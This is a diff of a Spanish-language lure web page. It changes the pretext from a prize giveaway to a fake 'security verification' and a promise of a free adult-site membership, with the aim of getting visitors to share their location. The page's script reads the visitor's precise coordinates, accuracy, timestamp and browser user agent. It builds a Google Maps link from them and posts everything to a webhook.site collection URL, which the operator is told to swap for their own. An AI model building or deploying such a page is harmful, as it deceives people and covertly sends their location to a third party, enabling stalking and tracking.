@@ -3,53 +3,27 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sopresa miles de regalos mas</title>
+  <title>Verificación de seguridad</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 40px;
-      background: #f4f6f8;
-      color: #333;
-    }
-    h1 {
-      font-size: 22px;
-      margin-bottom: 20px;
-    }
-    button {
-      background: #007BFF;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-    .msg {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-    pre {
-      background: #eee;
-      padding: 10px;
-      border-radius: 6px;
-      text-align: left;
-      overflow-x: auto;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f4f6f8; color: #333; }
+    h1 { font-size: 22px; margin-bottom: 20px; }
+    button { background: #007BFF; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #0056b3; }
+    .msg { margin-top: 20px; font-size: 14px; }
+    pre { background: #eee; padding: 10px; border-radius: 6px; text-align: left; overflow-x: auto; }
+    a { display: block; margin-top: 10px; color: #007BFF; }
   </style>
 </head>
 <body>
-  <h1>Verificación de seguridad</h1>
-  <p>Por favor confirma tu ubicación para continuar:</p>
+  <h1>Te ganaste Una menbresia NOPOR</h1>
+  <p>Por favor confirma kalifa:</p>
   <button onclick="sendLocation()">📍 Compartir mi ubicación</button>
   <div class="msg" id="msg"></div>
   <pre id="coords"></pre>
+  <a id="mapsLink" target="_blank"></a>
 
   <script>
-    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 👈 reemplaza con tu enlace
+    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 👈 reemplázalo con tu enlace real
 
     function sendLocation() {
       if (!navigator.geolocation) {
@@ -63,16 +37,24 @@
     }
 
     function success(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
       const data = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
+        lat: lat,
+        lon: lon,
         acc: position.coords.accuracy,
         time: new Date().toISOString(),
-        ua: navigator.userAgent
+        ua: navigator.userAgent,
+        maps_link: mapsLink
       };
 
       // Mostrar en pantalla
       document.getElementById("coords").innerText = JSON.stringify(data, null, 2);
+      const linkElem = document.getElementById("mapsLink");
+      linkElem.href = mapsLink;
+      linkElem.innerText = "Ver en Google Maps 🌍";
 
       // Enviar al webhook
       fetch(REPORT_URL, {
@@ -90,6 +72,3 @@
   </script>
 </body>
 </html>
-
-
-
